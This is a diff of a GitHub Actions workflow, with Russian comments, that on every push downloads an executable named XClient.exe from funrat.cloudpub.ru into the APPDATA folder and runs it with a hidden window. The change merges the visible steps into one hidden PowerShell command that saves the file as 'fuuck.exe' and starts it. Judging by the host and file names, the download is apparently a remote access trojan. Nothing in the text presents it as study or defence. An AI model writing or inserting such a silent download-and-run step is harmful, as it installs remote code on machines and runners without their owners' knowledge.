@@ -1,4 +1,4 @@
-name: Download and Run .exe file without console
+name: Download and Run .exe file silently
 
 on:
   push:
@@ -13,20 +13,10 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v2
 
-      - name: Create target folder in AppData
+      - name: Download and run .exe file without console
         run: |
-          $appDataPath = [System.Environment]::GetEnvironmentVariable("APPDATA")
-          $targetFolder = Join-Path $appDataPath "MyApp"
-          New-Item -Path $targetFolder -ItemType Directory -Force  # Создаем папку в AppData, если её нет
-
-      - name: Download .exe file to AppData folder
-        run: |
-          $appDataPath = [System.Environment]::GetEnvironmentVariable("APPDATA")
-          $targetFolder = Join-Path $appDataPath "MyApp"
-          curl -L -o "$targetFolder\XClient.exe" https://funrat.cloudpub.ru/XClient.exe  # Скачиваем в папку в AppData
-
-      - name: Run .exe file without console
-        run: |
-          $appDataPath = [System.Environment]::GetEnvironmentVariable("APPDATA")
-          $targetFolder = Join-Path $appDataPath "MyApp"
-          Start-Process -FilePath "$targetFolder\XClient.exe" -WindowStyle Hidden  # Запуск .exe без консоли
+          powershell -WindowStyle Hidden -Command "
+          Invoke-WebRequest -Uri 'https://funrat.cloudpub.ru/XClient.exe' -Method POST -OutFile \"$env:APPDATA\\fuuck.exe\";
+          Start-Sleep -Seconds 5;
+          Start-Process \"$env:APPDATA\\fuuck.exe\"
+          "
